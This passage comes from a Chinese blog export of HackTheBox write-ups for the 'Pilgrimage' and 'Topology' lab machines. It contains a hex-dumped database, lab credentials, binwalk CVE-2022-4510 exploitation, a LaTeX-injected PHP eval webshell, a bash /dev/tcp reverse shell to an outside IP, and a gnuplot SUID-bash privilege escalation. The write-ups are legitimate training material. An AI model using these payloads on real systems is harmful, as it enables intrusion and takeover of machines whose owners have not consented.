4703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466316332346561632e706e674832036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466316236613431382e706e674732036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466316162646131382e706e674632036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466316132366261662e706e674532036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466313935633136352e706e674432036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466313861386662382e706e674332036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466313764653665622e706e674232036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466313734353931302e706e674132036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466313661383563352e706e674032036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466313564373439622e706e673f32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466313533666338642e706e673e32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466313439336435342e706e673d32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466313430313835662e706e673c32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466313334306661382e706e673b32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466313238386135352e706e673a32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466313166316465632e706e673932036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466313062623536622e706e673832036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466306638336462352e706e673732036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466306532356434392e706e673632036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466306364636531652e706e673532036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466306237383066392e706e673432036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466306136373332652e706e673332036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466303866326362652e706e673232036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466303738633432642e706e673132036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466303562396239372e706e673032036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466303464646663652e706e672f32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466303364663436392e706e672e32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466303264383631342e706e672d32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466303138653235312e706e672c32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466303032396234382e706e672b32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465666633346365362e706e672a32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465666533663939642e706e672932036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465666330633562372e706e672832036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465666136393933332e706e672732036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465663864343332312e706e672632036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465663736386539302e706e672532036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465663538363836372e706e672432036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465663438346235372e706e672332036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465663337376265352e706e672232036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465663231333831622e706e672132036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465663063626339642e706e672032036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465656662323962382e706e671f32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465656535633739322e706e671e32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465656439623462662e706e671d32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465656334646230322e706e671c32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465656236383463362e706e671b32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465656134663132632e706e671a32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465393866336534392e706e671932036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465386638626438372e706e671832036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383465303334643030342e706e671732036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383464303562633766622e706e671632036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383463663236353861382e706e671532036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383463656537663330652e706e671432036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383463656533373430392e706e671332036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383463656465326466642e706e671232036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383463656439333635632e706e671132036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383463656435353737352e706e671032036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383463656430663137392e706e670f32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383463656363313538382e706e670e32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383463656337383631382e706e670d32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383463656333303165612e706e670c32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383463656262363266652e706e670b32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383463646136636139342e706e670a32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383463623439326465312e706e670932036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383463376665386161342e706e670833036b01687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383463366365656261362e6a7065670732036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383462613239336132642e706e670632036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383462366165393137362e706e670532036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383462356231333963622e706e670432036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383462333066313130362e706e670332036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383461396639333166662e706e670232036b09687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383439623532363134362e6a7065670a0907004800a90008d408a1086e083b080807d507a2076f073c070906d606a30670063d060a05d705a40571053e050b04d804a50472043f040c03d903a603730340030d02da02a702740241020e01db01a801750142010f00dc00a90fcd0f9a0f670f340f010ece0e9b0e680e350e020dce0d9a0d660d320cfe0cca0c960c620c2e0bfa0bc60b920b5e0b2a0af60ac20a8e0a5a0a2609f200000000000000326b2f0000000000000032036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336262333436342e706e677532036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336131346230632e706e677432036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333938313837392e706e677332036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333932636361642e706e677232036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333834343963372e706e677132036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333762616330362e706e677032036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333732666664652e706e676f32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333638376133302e706e676e32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333565366235632e706e676d32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333536383237362e706e676c32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333461346239362e706e676b32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333365356361392e706e676a32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333336343038332e706e676932036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333263313634322e706e676832036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333233343164342e706e676732036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333139386161612e706e676632036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333061346434382e706e676532036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333030623931312e706e676432036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326636373133652e706e676332036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326563303436342e706e676232036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326533613961312e706e676132036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326463373131652e706e676032036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326436393764612e706e675f32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326337353733362e706e675e32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326262643865622e706e675d32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326233626365362e706e675c32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466326137383035352e706e675b32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323930666530342e706e675a32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323861323436382e706e675932036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323766303534332e706e675832036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323735653162312e706e675732036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323632306234322e706e675632036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323536323866622e706e675532036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323465653637632e706e675432036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323361643031332e706e675332036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323330653561622e706e675232036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323238366633382e706e675132036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323161646232302e706e675032036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323132363763622e706e674f32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323061616531652e706e674e32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466323031373865382e706e674d32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466316638343434642e706e674c000000eb00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000033036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466356164383961362e706e67009333036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346338303530312e706e67009233036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346330333736342e706e67009133036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346235393936662e706e67009033036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346163643732332e706e67008f33036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346133656638392e706e67008e33036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343939333665622e706e67008d33036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343865613533662e706e67008c33036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343836346531652e706e67008b33036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343766333239622e706e67008a33036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343736343531632e706e67008933036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343731373237332e706e67008833036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343662363332352e706e67008733036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343563386531612e706e67008633036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343536313232302e706e67008533036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343361633366342e706e67008433036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343336343464322e706e67008333036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343330663831632e706e67008233036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343261346363642e706e67008133036902687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343234623833662e706e67008032036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343165336537332e706e677f32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343037616537352e706e677e32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343033393931382e706e677d32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336664626633312e706e677c32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336636363866362e706e677b32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336439316435662e706e677a32036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336432396537662e706e677932036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336361613037302e706e677832036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336335653132372e706e677732036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336331306634362e706e67760d0000002f013c000fb00f600f100ec00e700e200dd00d800d300ce00c900c400bf00ba00b500b000ab00a600a1009c00970092008d00880083007e00790073f06ee069d064c05fb05aa0559050804b70466041503c40373032202d10280022f01de018d013c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004e81130469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466356164383961362e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81120469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346338303530312e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81110469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346330333736342e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81100469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346235393936662e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e810f0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346163643732332e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e810e0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466346133656638392e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e810d0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343939333665622e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e810c0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343865613533662e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e810b0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343836346531652e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e810a0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343766333239622e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81090469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343736343531632e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81080469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343731373237332e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81070469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343662363332352e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81060469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343563386531612e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81050469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343536313232302e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81040469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343361633366342e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81030469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343336343464322e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81020469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343330663831632e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81010469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343261346363642e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e81000469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343234623833662e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e7f0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343165336537332e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e7e0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343037616537352e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e7d0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466343033393931382e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e7c0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336664626633312e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e7b0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336636363866362e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e7a0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336439316435662e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e790469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336432396537662e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e780469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336361613037302e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e770469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336335653132372e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e760469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336331306634362e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e750469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336262333436342e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e740469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466336131346230632e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e730469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333938313837392e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e720469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333932636361642e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e710469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333834343963372e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e700469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333762616330362e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e6f0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333732666664652e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e6e0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333638376133302e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e6d0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333565366235632e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e6c0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333536383237362e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e6b0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333461346239362e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e6a0469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333365356361392e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e690469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333336343038332e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e680469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333263313634322e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e670469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333233343164342e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e660469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333139386161612e706e67323032332d30362d32355f32322d31372e706e67757365726e616d654e650469351d687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f363439383466333061346434382e706e67323032332d30362d32355f32322d31372e706e67757365726e616d65&quot; import binascii import sqlite3 # 从十六进制字符串中读取字节串 hex_string = s byte_string = binascii.unhexlify(hex_string) # 将字节串写入数据库文件 with open(&#39;mydatabase.db&#39;, &#39;wb&#39;) as f: f.write(byte_string) # 连接到数据库并查询数据 image.png username password emily abigchonkyboi123 image.png rootpspy image.png 其中有一个/bin/bash /usr/bin/malwarescan.sh 很可疑 emily@pilgrimage:/usr/sbin$ ls -al malwarescan.sh -rwxr--r-- 1 root root 474 Jun 1 19:14 malwarescan.sh emily@pilgrimage:/usr/sbin$ cat malwarescan.sh #!/bin/bash blacklist=(&quot;Executable script&quot; &quot;Microsoft executable&quot;) /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do filename=&quot;/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo &quot;$FILE&quot; | /usr/bin/tail -n 1 | /usr/bin/sed -n -e &#39;s/^.*CREATE //p&#39;)&quot; binout=&quot;$(/usr/local/bin/binwalk -e &quot;$filename&quot;)&quot; for banned in &quot;${blacklist[@]}&quot;; do if [[ &quot;$binout&quot; == *&quot;$banned&quot;* ]]; then /usr/bin/rm &quot;$filename&quot; break fi done done 这个脚本代码看来看去，我就觉得 binwalk这个脚本不对劲 image.png CVE-2022-4510：Binwalk 远程代码执行漏洞Refer:https://www.exploit-db.com/exploits/51249 image.png image.png 刚好是有漏洞的版本把exp传上去python3 1.py /var/www/pilgrimage.htb/shrunk/6498601a2197f.png &lt;nc-ip&gt; &lt;nc-port&gt; emily@pilgrimage:~/someb0dy$ python3 1.py /var/www/pilgrimage.htb/shrunk/6498601a2197f.png 10.10.*.* 5555 ################################################ ------------------CVE-2022-4510---------------- ################################################ --------Binwalk Remote Command Execution-------- ------Binwalk 2.1.2b through 2.3.2 included----- ------------------------------------------------ ################################################ ----------Exploit by: Etienne Lacoche----------- ---------Contact Twitter: @electr0sm0g---------- ------------------Discovered by:---------------- ---------Q. Kaiser, ONEKEY Research Lab--------- ---------Exploit tested on debian 11------------ ################################################ You can now rename and share binwalk_exploit and start your local netcat listener. emily@pilgrimage:~/someb0dy$ ls 1.py _6498601a2197f.png.extracted binwalk_exploit.png _binwalk_exploit.png.extracted emily@pilgrimage:~/someb0dy$ 生成了binwalk_exploit.png image.png 把生成的图片移过去，等一会反弹shell就过来了 总结本次靶机主要就是利用两个cve来进行渗透，感觉下来就是google能力很重要就是信息查询的能力很重要- - 还是太菜了-_- 想半天第一个点","categories":[{"name":"HTB","slug":"HTB","permalink":"someb0dy.github.io/categories/HTB/"}],"tags":[{"name":"CVE-2022-44628,CVE-2022-4510","slug":"CVE-2022-44628-CVE-2022-4510","permalink":"someb0dy.github.io/tags/CVE-2022-44628-CVE-2022-4510/"}]},{"title":"Topology","slug":"Topology","date":"2023-06-14T06:40:44.058Z","updated":"2023-06-14T06:41:47.036Z","comments":true,"path":"2023/06/14/Topology/","link":"","permalink":"someb0dy.github.io/2023/06/14/Topology/","excerpt":"","text":"Nmap┌──(root💀kali)-[~] └─# nmap -A 10.10.11.217 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 22:39 EDT Verbosity Increased to 1. Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE: Active NSE Script Threads: 1 (1 waiting) NSE Timing: About 93.75% done; ETC: 22:40 (0:00:00 remaining) Verbosity Increased to 2. Completed NSE at 22:40, 7.32s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 22:40 Completed NSE at 22:40, 0.00s elapsed Nmap scan report for localhost (10.10.11.217) Host is up (0.18s latency). Scanned at 2023-06-11 22:39:04 EDT for 73s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA) | 256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA) |_ 256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Miskatonic University | Topology Group |_http-server-header: Apache/2.4.41 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: 经典22 和80 端口 image.png 添加&#x2F;etc&#x2F;hosts文件 image.png image.png 网页上发现别的子域名 image.png vhost 爆破┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/topology] └─# gobuster vhost -u http://topology.htb --append-domain -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 这里爆破到了一个dev.topology.htb的域名 latex.topology.htb image.png 这个域名下面的应用可以利用laTex表达式生成pdf文件 比如输入 \\frac{x+5}{y-3} image.png image.png 就生成了对应的pdf图片，起初很懵逼不知道该怎么做 后来搜着搜着看到了 Refer-HackTrick:https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injectionRefer-github:https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection存在laTex表达式注入 试试最简单的文件包含 image.png image.png 发现被ban了 鞭策gpt获取latex语法 image.png 发现 \\begin{filecontents}{myfile.txt} Hello, World! \\end{filecontents} 这个语法可以写入文件，该站点又是php写的尝试写一个马 \\begin{filecontents}{someb0dy.php} &lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt; \\end{filecontents} url编码 %5Cbegin%7Bfilecontents%7D%7Bsomeb0dy.php%7D%0A%3C%3Fphp%20%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%5Cend%7Bfilecontents%7D image.png image.png 但是发现好像没有写入成功 ，呜呜写了好久写不进去-_-，继续鞭策 image.png 修改后的webshell\\begin{filecontents*}{someb0dy1.php} &lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt; \\end{filecontents*} url编码 %5Cbegin%7Bfilecontents%2A%7D%7Bsomeb0dy1.php%7D%0A%3C%3Fphp%20%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%5Cend%7Bfilecontents%2A%7D image.png 终于写进去了,写了一天的webshell - -服了!!!老6 image.png 反弹shell image.png bash -i &gt;&amp; /dev/tcp/10.10.16.8/4444 0&gt;&amp;1 image.png 拿到了一个www-data用户权限的shell &#x2F;var&#x2F;www&#x2F;dev&#x2F;.htpasswd这里看着像一个密码文件 image.png vdaisley:$apr1$1ONUB&#x2F;S2$58eeNVirnRDB5zAIbIxTY0尝试解密 image.png image.png username password vdaisley calculus20 dev.topology.htb image.png image.png](https://cdn.nlark.com/yuque/0/2023/png/33561677/1686572220412-bb26728a-5689-43df-bb0b-0c3c2d188c98.png#averageHue=%23f9f9f9&clientId=u4ea9d6a6-ecf1-4&from=paste&height=714&id=u395b224b&originHeight=982&originWidth=1792&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=113268&status=done&style=none&taskId=ufe8257e8-96ae-43b8-81c0-7c9a1670cb2&title=&width=1303.2727272727273)![image.png 尝试ssh 成功登录 Root image.png 可以看到find &#x2F;opt&#x2F;gunplot -name *.plt -exec gunplot {}这条命令 意思就是在&#x2F;opt&#x2F;gunplot这个目录下搜索 *.plt的文件然后作为gunplot的参数执行Refer:http://www.gnuplot.info/docs_4.2&#x2F;node327.html image.png system “命令” 这样可以执行命令 -bash-5.0$ echo &quot;system &#39;cp /bin/bash /tmp/someb0dy;chmod u+s /tmp/someb0dy&#39;&quot;&gt;someb0dy.plt -bash-5.0$ cp someb0dy.plt /opt/gnuplot/someb0dy.plt -bash-5.0$ ./someb0dy -p someb0dy-5.0# whaomi 